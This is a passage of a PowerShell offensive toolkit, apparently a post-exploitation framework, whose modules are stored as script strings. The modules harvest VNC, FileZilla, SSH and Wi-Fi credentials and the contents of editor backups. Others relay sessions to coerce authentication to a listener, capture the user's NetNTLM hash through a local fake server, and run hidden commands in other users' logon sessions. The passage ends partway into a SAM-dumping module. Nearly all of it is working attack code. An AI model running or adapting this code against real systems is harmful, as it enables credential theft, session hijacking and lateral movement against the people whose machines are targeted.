        Write-Output ""
    }

    $tightVNCResults = Search-TightVNC-Passwords
    if ($tightVNCResults -ne $null) {
        $Loot = $true
        $tightVNCResults | ForEach-Object { Write-Output $_ }
        Write-Output "========================================"
        Write-Output ""
    }

    $tigerVNCResults = Search-TigerVNC-Passwords
    if ($tigerVNCResults -ne $null) {
        $Loot = $true
        Write-Output "[TigerVNC]"
        Write-Output "========================================"
        $tigerVNCResults | ForEach-Object { Write-Output $_ }
        Write-Output "========================================"
        Write-Output ""
    }

    $ultraVNCResults = Search-UltraVNC-Passwords -Paths $UltraVNCPaths
    if ($ultraVNCResults -ne $null) {
        $Loot = $true
        Write-Output "[UltraVNC]"
        Write-Output "========================================"
        $ultraVNCResults | ForEach-Object { Write-Output $_ }
        Write-Output "========================================"
        Write-Output ""
    }

    if (-not $Loot) {
        Write-Output "No Results"
    }
} VNC-Hunt
'@

################################################################################################################
######################################## Module: FileZilla #####################################################
################################################################################################################

$Global:LocalFileZilla = @'
function Get-FileZillaCredentials {
    $userProfilesPath = "C:\Users"
    $filePaths = @(
        "\AppData\Roaming\FileZilla\sitemanager.xml",
        "\AppData\Roaming\FileZilla\recentservers.xml"
    )

    [bool]$Loot = $false
    
    $userProfiles = Get-ChildItem -Path $userProfilesPath | Where-Object { $_.PSIsContainer }

    foreach ($userProfile in $userProfiles) {
        foreach ($relativePath in $filePaths) {
            $filePath = Join-Path -Path $userProfile.FullName -ChildPath $relativePath
            if (Test-Path $filePath) {
                $Loot = $true
                Write-Output ""
                Write-Output "Path: $filePath"
                try {
                    [xml]$fileContent = Get-Content -Path $filePath -ErrorAction Stop
                } catch {
                    continue
                }

                $servers = @()
                if ($fileContent.FileZilla3.RecentServers.Server) {
                    $servers += $fileContent.FileZilla3.RecentServers.Server
                }
                if ($fileContent.FileZilla3.Servers.Server) {
                    $servers += $fileContent.FileZilla3.Servers.Server
                }

                foreach ($Server in $servers) {
                    $hostName = $Server.Host
                    $port = $Server.Port
                    $userName = $Server.User
                    $encodedPassword = $Server.Pass.'#text'

                    try {
                        if ($encodedPassword -ne "") {
                            $password = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedPassword))
                        } else {
                            $password = "No password set"
                        }
                    }
                    catch {
                        $password = "Failed to decode base64 string"
                    }

                    Write-Output "==========================="
                    Write-Output "Host: $hostName"
                    Write-Output "Port: $port"
                    Write-Output "User: $userName"
                    Write-Output "Password: $password"
                    Write-Output "==========================="
                }
            } 
        }
    }

    if (-not $Loot) {
        Write-Output "No Results"
    }
} Get-FileZillaCredentials
'@

################################################################################################################
############################################# Module: SSH ######################################################
################################################################################################################

$Global:LocalSSH = @'
function Invoke-SSHDump {
    $Directory_Child_Items = @()
    $foundResults = $false

    function Get-UserDirectories {
        Get-ChildItem -Path "C:\Users" -Directory | Where-Object {
            Test-Path "$($_.FullName)\.ssh"
        }
    }

    $SSH_Files = Get-UserDirectories

    foreach ($UserDir in $SSH_Files) {
        $Files = Get-ChildItem -Path "$($UserDir.FullName)\.ssh" | Select-Object -ExpandProperty FullName
        
        foreach ($File in $Files) {
            $Content = Get-Content $File -First 1

            if ($Content -like "----*") {
                $foundResults = $true
                Write-Output "[Key: $($File)]"
                Write-Output ""
                Get-Content -Path $File -Raw
                continue
            }

            if ($Content -like "ssh-*") {
                $foundResults = $true
                Write-Output "[Public Key: $($File)]"
                Write-Output ""
                Get-Content -Path $File -Raw
                continue
            }

            if ($File -like "*known_hosts*") {
                $foundResults = $true
                Write-Output "[Known Hosts: $($File)]"
                Write-Output ""
                Get-Content -Path $File -ErrorAction "SilentlyContinue" | ForEach-Object { ($_ -split '\s+')[0] }
                Write-Output ""
                continue
            }
        }
    }

    if (-not $foundResults) {
        Write-Output "No Results"
    }
}

Invoke-SSHDump
'@

################################################################################################################
############################################ Module: Wifi ######################################################
################################################################################################################

$Global:LocalWifi = @'
function Wifi-Dump {
    $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    }

    $results = foreach ($profile in $wifiProfiles) {
        $profileInfo = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content\W+:(.+)$"

        if ($profileInfo) {
            $password = $profileInfo.Matches.Groups[1].Value.Trim()
            [PSCustomObject]@{
                PROFILE_NAME = $profile
                PASSWORD     = $password
            }
        }
    }

    if ($results) {
        $results | Select-Object PROFILE_NAME, PASSWORD | Out-string | Write-Output
    }
    else {
        return "No Results"
    }
} Wifi-Dump
'@

################################################################################################################
########################################## Module: Notepad #####################################################
################################################################################################################

$Global:LocalNotepad = @'

function DumpNotepad {

    function Extract-Strings {
        param (
            [Parameter(Mandatory = $true)]
            [ValidateScript({ Test-Path $_ -PathType 'Leaf' })]
            [string]$FilePath,

            [ValidateSet('Default', 'Ascii', 'Unicode')]
            [string]$Encoding = 'Default',

            [uint32]$MinimumLength = 3
        )

        $Results = @()

        if ($Encoding -eq 'Unicode' -or $Encoding -eq 'Default') {
            $UnicodeFileContents = [System.IO.File]::ReadAllText($FilePath, [System.Text.Encoding]::Unicode)
            $UnicodeRegex = "[\u0020-\u007E]{$MinimumLength,}"
            $Results += [regex]::Matches($UnicodeFileContents, $UnicodeRegex) | ForEach-Object { $_.Value }
        }

        if ($Encoding -eq 'Ascii' -or $Encoding -eq 'Default') {
            $AsciiFileContents = [System.IO.File]::ReadAllBytes($FilePath)
            $AsciiString = -join ($AsciiFileContents | ForEach-Object { [char]$_ })
            $AsciiRegex = "[\x20-\x7E]{$MinimumLength,}"
            $Results += [regex]::Matches($AsciiString, $AsciiRegex) | ForEach-Object { $_.Value }
        }

        $Results
    }
    
    
function Get-UserProfilePaths { (Get-ChildItem -Path "$env:SystemDrive\Users" | Where-Object { $_.BaseName -ne "Public" -and $_.BaseName -notlike "*defaultuser*" }).BaseName }
    
function Get-NotePadPlusPlus {
    param ([string]$UserProfile)

    $RootPath = "C:\Users\$UserProfile\AppData\Roaming\Notepad++\backup"
    $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"

    foreach ($BackupFile in $BackupFiles) {
        
        try {
            
            $Content = Get-Content -Path $BackupFile.FullName -Raw -ErrorAction "Stop"

            Write-Output "File Path: $($BackupFile.FullName)"
            Write-Output ""
            Write-Output $Content
            Write-Output "========================================================================================="
        
        } catch {}
    }
}

function Get-Notepad {
    param ([string]$UserProfile)

    $PackagesPath = "C:\Users\$UserProfile\AppData\Local\Packages"
    $NotepadPath = Get-ChildItem -Path $PackagesPath -Filter "Microsoft.WindowsNotepad_*" -Directory -ErrorAction SilentlyContinue | Select-Object -First 1

    if ($NotepadPath) {
        $RootPath = Join-Path -Path $NotepadPath.FullName -ChildPath "LocalState\TabState"
        $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"

        foreach ($BackupFile in $BackupFiles) {
            
            try {
                
                $Content = Extract-Strings -FilePath $BackupFile.FullName -ErrorAction "Stop"

                Write-Output "File Path: $($BackupFile.FullName)"
                Write-Output ""
                Write-Output $Content
                Write-Output "========================================================================================="
            
            } catch {}
        }
    }
}

function Get-ISE {
    param ([string]$UserProfile)

    $RootPath = "C:\Users\$UserProfile\AppData\Local\Microsoft_Corporation"
    $ISE_Dir = Get-ChildItem -Path $RootPath -Filter "powershell_ise*" -Directory -ErrorAction "SilentlyContinue" | Select-Object -First 1

    if ($ISE_Dir) {
        $AutoSavePath = Join-Path -Path $ISE_Dir.FullName -ChildPath "3.0.0.0\AutoSaveFiles"
        $BackupFiles = Get-ChildItem -Path $AutoSavePath -ErrorAction "SilentlyContinue"

        foreach ($BackupFile in $BackupFiles) {
           
            try {
                
                $Content = Get-Content -Path $BackupFile.FullName -Raw -ErrorAction "Stop"

                Write-Output "File Path: $($BackupFile.FullName)"
                Write-Output ""
                Write-Output $Content
                Write-Output "========================================================================================="
            
            } catch {}
        }
    }
}

function Get-VSCode {
    param ([string]$UserProfile)

    $RootPath = "C:\Users\$UserProfile\AppData\Roaming\Code\Backups"

    if (Test-Path $RootPath) {
        $SessionDirs = Get-ChildItem -Path $RootPath -Directory -ErrorAction "SilentlyContinue"

        foreach ($Session in $SessionDirs) {
            $BackupFiles = Get-ChildItem -Path $Session.FullName -Recurse -File -ErrorAction "SilentlyContinue"

            foreach ($BackupFile in $BackupFiles) {
                
                try {
                    
                    $Content = Get-Content -Path $BackupFile.FullName -Raw -ErrorAction "Stop"

                    Write-Output "File Path: $($BackupFile.FullName)"
                    Write-Output ""
                    Write-Output $Content
                    Write-Output "========================================================================================="
                
                } catch {}
            }
        }
    }
}
    
$UserProfiles = Get-UserProfilePaths
    
foreach ($UserProfile in $UserProfiles) { Get-NotePadPlusPlus -UserProfile $UserProfile }   
foreach ($UserProfile in $UserProfiles) { Get-Notepad -UserProfile $UserProfile         }
foreach ($UserProfile in $UserProfiles) { Get-ISE -UserProfile $UserProfile             }
foreach ($UserProfile in $UserProfiles) { Get-VSCode -UserProfile $UserProfile          }

}
    
$Loot = DumpNotepad
if (!$Loot) { Write-Output "No Results" } else {
    Write-Output "========================================================================================="
    $Loot | Write-Output
    Write-Output "========================================================================================="
}
    
'@

################################################################################################################
######################################## Module: SessionRelay ##################################################
################################################################################################################

$Global:LocalSessionRelay = @'
function Invoke-SessionRelay {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [Alias("ID")]
        [string]$SessionID,

        [Parameter(Mandatory = $true)]
        [ValidateScript({
            $_ -match '^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}$'
        })]
        [string]$ListenerIP,

        [string]$Path = "\\$ListenerIP\$([string]::Join('', (65..90 + 97..122 | Get-Random -Count 12 | % {[char]$_})))"
    )

    if (-not ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")) { Write-Output "[-] Not running as SYSTEM" ; return }


    function Get-UserSessions {
        $quserOutput = quser

        $quserLines = $quserOutput | Select-Object -Skip 1

        $sessions = foreach ($line in $quserLines) {
            $cleanLine = $line -replace '>', ''

            $regex = '^\s*(\S*)\s+(\S*)\s+(\d+)\s+(\S+)\s+(\S+)\s+(.+)$'
            if ($cleanLine -match $regex) {
                [PSCustomObject]@{
                    Username    = $matches[1]
                    SessionName = $matches[2]
                    ID          = [int]$matches[3]
                    State       = $matches[4]
                    IdleTime    = $matches[5]
                    LogonTime   = $matches[6]
                }
            }
        }

        return $sessions
    }

    $APClientHxHelpPaneServerClass = @"
using System;
using System.Runtime.InteropServices;

namespace APClientHxHelpPane {
    public static class Server {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }

        public static void execute(string new_session_id, string path) {
            try {
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(path);
                server.Execute(target.AbsoluteUri);
            }
            catch {
            }
        }
    }
}
"@

    if (!([System.Management.Automation.PSTypeName]'APClientHxHelpPane.Server').Type) {
        Add-Type $APClientHxHelpPaneServerClass
    }

    $sessions = Get-UserSessions

    $validStates = @("Active", "Connected", "ConnectQuery", "Shadow", "Disconnected", "Idle", "Disc", "Listen")

    $CurrentSessionID = (Get-Process -PID $pid).SessionID

    foreach ($session in $sessions) {
        # Skip the current session
        if ($session.ID -eq $CurrentSessionID) { continue }

        # Check if the session state is valid
        if ($validStates -contains $session.State) {
            Write-Output "[+] Relaying as $($session.Username) under Session ID:$($session.ID)"
            [APClientHxHelpPane.Server]::execute([string]$session.ID, $Path)
        }
    }
}
'@

################################################################################################################
############################################ Module: NTLM ######################################################
################################################################################################################

$Global:NetNTLM = @'
function Get-NetNTLM-Hash {

    $NetNTLM_ScriptBlock = {
        param ($port)
    
        function Decode-NTLM {
    param
    (
        [byte[]]$NTLM
    )

    $LMHash_len = [bitconverter]::ToInt16($NTLM,12)
    $LMHash_offset = [bitconverter]::ToInt16($NTLM,16)
    $LMHash = $NTLM[$LMHash_offset..($LMHash_offset+$LMHash_len-1)]
    $NTHash_len = [bitconverter]::ToInt16($NTLM,20)
    $NTHash_offset = [bitconverter]::ToInt16($NTLM,24)
    [byte[]]$NTHash = $NTLM[$NTHash_offset..($NTHash_offset+$NTHash_len-1)]
    $User_len = [bitconverter]::ToInt16($NTLM,36)
    $User_offset = [bitconverter]::ToInt16($NTLM,40)
    $User = $NTLM[$User_offset..($User_offset+$User_len-1)]
    $User = [System.Text.Encoding]::Unicode.GetString($User)

    if ($NTHash_len -eq 24) {
        # NTLMv1
        $HostName_len = [bitconverter]::ToInt16($NTLM,46)
        $HostName_offset = [bitconverter]::ToInt16($NTLM,48)
        $HostName = $NTLM[$HostName_offset..($HostName_offset + $HostName_len - 1)]
        $HostName = [System.Text.Encoding]::Unicode.GetString($HostName)

        # Convert LMHash and NTHash to hexadecimal strings
        $LMHashHex = [System.BitConverter]::ToString($LMHash).Replace("-", "")
        $NTHashHex = [System.BitConverter]::ToString($NTHash).Replace("-", "")

        $retval = "${User}::${HostName}:${LMHashHex}:${NTHashHex}:1122334455667788"
        return $retval
    
    } elseif ($NTHash_len -gt 24) {
        # NTLMv2
        $NTHash_len = 64
        $Domain_len = [bitconverter]::ToInt16($NTLM,28)
        $Domain_offset = [bitconverter]::ToInt16($NTLM,32)
        $Domain = $NTLM[$Domain_offset..($Domain_offset+$Domain_len-1)]
        $Domain = [System.Text.Encoding]::Unicode.GetString($Domain)
        $HostName_len = [bitconverter]::ToInt16($NTLM,44)
        $HostName_offset = [bitconverter]::ToInt16($NTLM,48)
        $HostName = $NTLM[$HostName_offset..($HostName_offset+$HostName_len-1)]
                
        $HostName = [System.Text.Encoding]::Unicode.GetString($HostName)
        $NTHash_part1 = [System.BitConverter]::ToString($NTHash[0..15]).Replace("-","")
        $NTHash_part2 = [System.BitConverter]::ToString($NTHash[16..($NTHash.Length - 1)]).Replace("-","")
        $retval = "${User}::${Domain}:1122334455667788:${NTHash_part1}:${NTHash_part2}"
        return $retval
    }
    Write-Error "Could not parse NTLM hash"
}
    
    
        function Handle-WebRequest {  
    
            param
            (
                [string]$method, [string]$uri, [string]$httpversion, [hashtable]$headers, [string]$body
            )
            if ($headers.Contains("authorization") -eq 0) {
                return "HTTP/1.0 401 Unauthorized`r`nServer: Microsoft-IIS/6.0`r`nContent-Type: text/html`r`nWWW-Authenticate: NTLM`r`nX-Powered-By: ASP.NET`r`nConnection: Close`r`nContent-Length: 0`r`n`r`n"
            }
            elseif ($headers.Contains("authorization")) {        
                [string[]]$auth = $headers["authorization"].split()
                if ($auth[0] -eq "NTLM") {
                    $auth[1] = $auth[1].TrimStart()
                    [byte[]] $NTLMHash = [System.Convert]::FromBase64String($auth[1])
                    if ($NTLMHash[8] -eq 3) {
                        [string]$NTLMHash = Decode-NTLM($NTLMHash)                            
                        return "HTTP/1.1 200 OK`r`n`r`n" + $NTLMHash + "`r`n"
                    }
                }
    
                return "HTTP/1.1 401 Unauthorized`r`nServer: Microsoft-IIS/6.0`r`nContent-Type: text/html`r`nWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==`r`nConnection: Close`r`nContent-Length: 0`r`n`r`n"
            }
        }   
    
        function Start-HashServer {
            [CmdletBinding()]
            param
            (
                [int]$port
            )
            $foundPort = $false
            while (!$foundPort) {
                trap [System.Net.Sockets.SocketException] {                    
                    $port = $port + 1               
                    continue;
                }    
                $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback, $port)
                $listener.Start()
                $foundPort = $true
            }
            $doexit = 0
            do {
                $client = $listener.AcceptTcpClient()
                $stream = $client.GetStream()
                [System.IO.StreamReader]$reader = new-object System.IO.StreamReader -argumentList $stream
                [System.IO.StreamWriter]$writer = new-object System.IO.StreamWriter -argumentList $stream
                $state = 0
                $method = ""
                $uri = ""
                $httpver = ""
                $requestFinished = 0
                $headers = @{}
    
                while ($requestFinished -eq 0) {
                    if ($state -eq 0) {                
                        $line = $reader.ReadLine()
                        $line = $line.split(" ")
                        [string]$method = $line[0]
                        [string]$uri = $line[1]
                        [string]$httpver = $line[2]
                        $state = 1
                    }
                    elseif ($state -eq 1) {
                        $line = $reader.ReadLine()
                        if ($line -eq "") {                                                                                
                            $requestFinished = 1                            
                            $response = Handle-WebRequest -method $method -uri $uri -httpversion $httpver -headers $headers -body $body
                            if ($response -like "HTTP/1.1 200 OK*") {
                                $doexit = 1
                            }
                            $writer.Write($response -join (''))
                            $writer.Flush()
                            $client.Close()                                                                                
                        }
                        else {
                            $line = $line.Split(":")
                            $key = $line[0].Trim().ToLower()
                            $val = $line[1].TrimStart()
                            $headers.Add($key, $val)
                        }
                    }
                }
    
    
            }  while ($doexit -eq 0) 
            $listener.stop()
        }
        Start-HashServer -port $port
    }
    
    # Find available port
    $random = New-Object System.Random
    $usedPorts = Get-NetTCPConnection -LocalAddress 0.0.0.0 | Select-Object -ExpandProperty LocalPort
    $port = $null
    
    while (-not $port) {
        $potential = $random.Next(1025, 65535)
        $port = if ($usedPorts -notcontains $potential) { $potential }
    }
    
    
    $job = Start-Job -ScriptBlock $NetNTLM_ScriptBlock -ArgumentList $port
    
    Start-Sleep 1
    
    try {
        
        $response = Invoke-RestMethod -Uri http://localhost:$port -UseDefaultCredentials -TimeoutSec 10
        Write-Output $response
    }
    
    catch {
        
        Write-Output "Unexpected Error"
        break
    }
    finally {
    
        Stop-Job -Job $job
        Remove-Job -Job $job -Force
    }
    
} Get-NetNTLM-Hash

'@

################################################################################################################
######################################## Module: SessionExec ###################################################
################################################################################################################


$Global:LocalSessionExec = @'

function Write-Pipe {
    param (
        [Parameter(Mandatory = $true)]
        [string]$PipeName,
        [Parameter(Mandatory = $true)]
        [string]$Command,
        [switch]$Persistent
    )

    $runspace = [powershell]::Create().AddScript({
        param ($PipeName, $Command, $Persistent)
        $pipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        $accessRule = New-Object System.IO.Pipes.PipeAccessRule("Everyone", [System.IO.Pipes.PipeAccessRights]::ReadWrite, [System.Security.AccessControl.AccessControlType]::Allow)
        $pipeSecurity.AddAccessRule($accessRule)

        $pipeServer = $null

        try {
            do {
                $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName, [System.IO.Pipes.PipeDirection]::Out, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::None, 4096, 4096, $pipeSecurity)
                $pipeServer.WaitForConnection()
                $writer = New-Object System.IO.StreamWriter($pipeServer)
                $writer.AutoFlush = $true
                $writer.WriteLine($Command)
                $writer.Close()
                $pipeServer.Dispose()
            } while ($Persistent)
        } finally {
            if ($pipeServer -ne $null) {
                $pipeServer.Dispose()
            }
        }
    }).AddArgument($PipeName).AddArgument($Command).AddArgument($Persistent)

    $null = $runspace.BeginInvoke()
}

$a = {
# Function to read from a named pipe
function Read-Pipe {
    param (
        [Parameter(Mandatory = $true)]
        [string]$PipeName,
        [switch]$Decode
    )

    Start-Sleep -Seconds 1

    $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", $PipeName, [System.IO.Pipes.PipeDirection]::In)
    $pipeClient.Connect()
    $reader = New-Object System.IO.StreamReader($pipeClient)
    $Command = $reader.ReadToEnd()
    $reader.Close()
    $pipeClient.Dispose()

    if ($Decode) {
        $Command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Command))
    }

    Write-Output $Command
}

}

function Invoke-SessionExec {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$SessionID,
        [Parameter(Mandatory=$false)]
        [string]$PipeName,
        [Parameter(Mandatory=$false)]
        [string]$Command
    )

    if (-not [System.Management.Automation.PSTypeName]'NativeMethods'.Type) {
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.IO;
        using System.Runtime.InteropServices;
        using Microsoft.Win32.SafeHandles;

        public class NativeMethods
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                public bool bInheritHandle;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct STARTUPINFO
            {
                public int cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public int dwX;
                public int dwY;
                public int dwXSize;
                public int dwYSize;
                public int dwXCountChars;
                public int dwYCountChars;
                public int dwFillAttribute;
                public int dwFlags;
                public short wShowWindow;
                public short cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [DllImport("wtsapi32.dll", SetLastError = true)]
            public static extern bool WTSQueryUserToken(int sessionId, out IntPtr Token);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern bool CreateProcessAsUser(
                IntPtr hToken,
                string lpApplicationName,
                string lpCommandLine,
                ref SECURITY_ATTRIBUTES lpProcessAttributes,
                ref SECURITY_ATTRIBUTES lpThreadAttributes,
                bool bInheritHandles,
                uint dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                ref STARTUPINFO lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CloseHandle(IntPtr hObject);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
        }
"@
    }

function ReadStream {
    param (
        [IntPtr]$handle
    )

    $result = ""
    $buffer = New-Object byte[] 4096
    $safeHandle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle($handle, $false)
    $stream = New-Object System.IO.FileStream($safeHandle, [System.IO.FileAccess]::Read, 4096, $false)
    $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::Default)

    while (($line = $reader.ReadLine()) -ne $null) {
        $result += $line + "`n" 
    }

    $reader.Close()
    $stream.Close()
    $safeHandle.Close()
    
    return $result
}



    function Execute-CommandInSession {
        param (
            [int]$SessionId,
            [string]$Command
        )

        $userToken = [IntPtr]::Zero

        if (-not [NativeMethods]::WTSQueryUserToken($SessionId, [ref]$userToken)) {
            throw [System.ComponentModel.Win32Exception]::New([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }

        $sa = New-Object NativeMethods+SECURITY_ATTRIBUTES
        $sa.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($sa)
        $sa.bInheritHandle = $true
        $si = New-Object NativeMethods+STARTUPINFO
        $pi = New-Object NativeMethods+PROCESS_INFORMATION
        $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)

        $stdoutReadPipe = [IntPtr]::Zero
        $stdoutWritePipe = [IntPtr]::Zero
        $stderrReadPipe = [IntPtr]::Zero
        $stderrWritePipe = [IntPtr]::Zero

        if (-not [NativeMethods]::CreatePipe([ref]$stdoutReadPipe, [ref]$stdoutWritePipe, [ref]$sa, 0)) {
            throw [System.ComponentModel.Win32Exception]::New([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }
        if (-not [NativeMethods]::CreatePipe([ref]$stderrReadPipe, [ref]$stderrWritePipe, [ref]$sa, 0)) {
            throw [System.ComponentModel.Win32Exception]::New([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }

        $si.dwFlags = 0x00000100 -bor 0x00000200 -bor 0x00000400 -bor 0x00000001 # STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
        $si.hStdOutput = $stdoutWritePipe
        $si.hStdError = $stderrWritePipe
        $si.wShowWindow = 0 # SW_HIDE


        $Command = "$a ; Read-Pipe -PipeName $randomPipeName -Decode | Out-string | IEX"
        $PowerShell = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
        $arguments = "- -NoProfile -EncodedCommand $base64Command"

        if (-not [NativeMethods]::CreateProcessAsUser($userToken, $PowerShell, $arguments, [ref]$sa, [ref]$sa, $true, 0, [IntPtr]::Zero, $PWD.Path, [ref]$si, [ref]$pi)) {
            throw [void][System.ComponentModel.Win32Exception]::New([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }

        [void][NativeMethods]::CloseHandle($stdoutWritePipe)
        [void][NativeMethods]::CloseHandle($stderrWritePipe)

        $stdoutOutput = ReadStream -handle $stdoutReadPipe
        $stderrOutput = ReadStream -handle $stderrReadPipe

        # Clean up
        [void][NativeMethods]::CloseHandle($pi.hProcess)
        [void][NativeMethods]::CloseHandle($pi.hThread)
        [void][NativeMethods]::CloseHandle($userToken)
        [void][NativeMethods]::CloseHandle($stdoutReadPipe)
        [void][NativeMethods]::CloseHandle($stderrReadPipe)

        return $stdoutOutput
    }

    function Get-UserSessions {
        $quserOutput = quser

        $quserLines = $quserOutput | Select-Object -Skip 1

        $sessions = foreach ($line in $quserLines) {

            $cleanLine = $line -replace '>', ''

            $regex = '^\s*(\S*)\s+(\S*)\s+(\d+)\s+(\S+)\s+(\S+)\s+(.+)$'
            if ($cleanLine -match $regex) {
                [PSCustomObject]@{
                    Username    = $matches[1]
                    SessionName = $matches[2]
                    ID          = [int]$matches[3]
                    State       = $matches[4]
                    IdleTime    = $matches[5]
                    LogonTime   = $matches[6]
                }
            }
        }

        return $sessions
    }

    Write-Output ""

    $sessions = Get-UserSessions
    $CurrentSessionID = (Get-Process -PID $pid).SessionID
    $validStates = @("Active", "Connected", "ConnectQuery", "Shadow", "Disconnected", "Idle", "Disc", "Listen")

    if ($SessionID -eq "All") {
        foreach ($session in $sessions) {
            if ($session.ID -eq $CurrentSessionID -or -not $validStates -contains $session.State) { continue }
            $randomPipeName = [guid]::NewGuid().ToString()
            Write-Pipe -PipeName $randomPipeName -Command "$Command"
            Write-Output "[+] Invoking Command as $($session.Username)[$($session.ID)]"
            $output = Execute-CommandInSession -SessionId ($session.ID) -Command $Command | Out-string
            Write-Output $output
        }
    } else {
        $session = $sessions | Where-Object { $_.ID -eq $SessionID }
        if ($null -ne $session -and $validStates -contains $session.State) {
            Write-Output "[+] Invoking Command under Session ID:$SessionID"
            $output = Execute-CommandInSession -SessionId $SessionID -Command $Command | Out-string
            Write-Output $output
        } 
    }
}

'@

################################################################################################################
########################################## Module: VMCheck #####################################################
################################################################################################################
$Global:LocalVMCheck = @'

Function Check_Virtual {

$ComputerSystem = Get-WmiObject -Class Win32_ComputerSystem
$Model = $ComputerSystem.Model
$Manufacturer = $ComputerSystem.Manufacturer
$IsVirtual = $null

if ($Model -match 'VMware Virtual Platform' -or
    $Model -match 'Virtual Machine' -or
    $Model -match 'KVM' -or
    $Model -match 'VirtualBox' -or
    $Model -match 'QEMU' -or
    $Model -match 'Microsoft Virtual Machine' -or
    $Model -match 'Hyper-V' -or
    ($Manufacturer -match 'Microsoft Corporation' -and $Model -match 'Virtual Machine') -or
    $Manufacturer -match 'VMware, Inc.' -or
    $Manufacturer -match 'Oracle Corporation' -or
    $Manufacturer -match 'Parallels Software International' -or
    ($Manufacturer -match 'Citrix Systems' -and $Model -match 'Xen') -or
    ($Manufacturer -match 'Huawei Technologies' -and $Model -match 'FusionCompute')) {
    $IsVirtual = "Virtual System"
} else {
    $IsVirtual = "Physical System"
}


return $IsVirtual

}

Check_Virtual

'@

################################################################################################################
######################################### Module: PPLCheck #####################################################
################################################################################################################

$Global:LocalPPLCheck = @'

$PPLQuery = try {
    Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" -ErrorAction "SilentlyContinue"
} Catch { 
    [string] "RunAsPPL Disabled"
}

if ($PPLQuery.RunAsPPL -eq 1) {
    [string] "RunAsPPL Enabled"
} else {
    [string] "RunAsPPL Disabled"
}

'@

################################################################################################################
############################################ Module: SAM #######################################################
################################################################################################################

# Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
$Global:LocalSAM = @'
function Invoke-DumpSAM {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $X1 }).GetType($X2)
        $PtrOverload = $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)

        if ($PtrOverload) {

            $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
            return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
        }
        else {
